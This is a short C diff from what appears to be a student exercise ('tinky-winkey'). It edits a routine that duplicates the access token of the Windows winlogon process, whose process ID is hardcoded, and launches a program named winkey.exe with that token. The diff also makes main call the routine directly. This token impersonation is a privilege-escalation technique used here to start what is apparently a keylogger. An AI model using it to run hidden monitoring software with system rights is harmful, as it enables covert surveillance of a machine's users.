@@ -74,7 +74,7 @@ void impersonateUserToken()
     HANDLE winlogonTokenHandle;
     HANDLE winlogonDuplicateTokenHandle;
 
-    DWORD WINLOGON_PID = 1360;
+    DWORD WINLOGON_PID = 2376;
 
     HANDLE currentTokenHandle = NULL;
 	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentTokenHandle);
@@ -116,7 +116,7 @@ void impersonateUserToken()
 
 
 	// Call CreateProcessWithTokenW(), print return code and error code
-	BOOL createProcess = CreateProcessWithTokenW(winlogonDuplicateTokenHandle, LOGON_WITH_PROFILE, L"c:\\Users\\Titouan\\Documents\\42\\tinky-winkey-main\\winkey\\winkey.exe", NULL, 0, NULL, NULL, NULL, NULL);
+	BOOL createProcess = CreateProcessWithTokenW(winlogonDuplicateTokenHandle, LOGON_WITH_PROFILE, L"c:\\Users\\Titouan\\Documents\\42\\tinky-winkey\\winkey\\winkey.exe", NULL, 0, NULL, NULL, NULL, NULL);
 	if (GetLastError() == NULL)
 		printf("[+] Process spawned!\n");
 	else
@@ -143,6 +143,8 @@ void impersonateUserToken()
 //
 int __cdecl _tmain(int argc, TCHAR *argv[]) 
 { 
+    impersonateUserToken();
+    return;
     // If command-line parameter is "install", install the service. 
 
     // TO_DO: Add any additional services for the process to this table.
